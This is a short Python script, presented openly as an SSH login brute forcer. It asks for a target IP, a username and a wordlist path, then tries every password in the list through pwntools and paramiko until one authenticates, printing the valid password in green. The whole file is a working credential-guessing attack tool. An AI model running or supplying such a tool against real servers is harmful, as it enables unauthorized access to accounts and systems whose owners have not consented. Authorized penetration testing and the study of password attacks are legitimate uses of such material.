from pwn import *
import paramiko
from termcolor import colored

print("-----------------------------------------")
print("##### PYTHON SSH LOGIN BRUTE FORCER #####")
print("-----------------------------------------")
target = str(input("[.] ENTER THE TARGET IP: "))
username = str(input("[.] ENTER SSH USERNAME: "))
passfile = str(input("[.] ENTER THE PATH TO WORDLIST: "))
print("-----------------------------------------")
attempts = 0

if not os.path.isfile(passfile):
    print(f"[x] WORDLIST FILE NOT FOUND: {passfile}")
    print("TRY TO ENTER TH FULL PATH TO THE WORDLIST FILE!!")
    exit()

with open(passfile, "r") as wordlist:
	for password in wordlist:
		password = password.strip("\n")
		try:
			print(f"[{attempts}] ATTEMPTING PASSWORD: {password}")
			response = ssh(host=target, user=username, password=password, timeout=1) 
			if response.connected():
				print(f"[!] SUCCESSFULLY AUTHENTICATED AFTER {attempts} ATTEMPTS!!")
				print("-----------------------------------------")
				print(f"[!] VALID PASSWORD: {colored(password, 'green')}")
				print("-----------------------------------------")
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[x] INVALID PASSWORD!!")
		attempts += 1



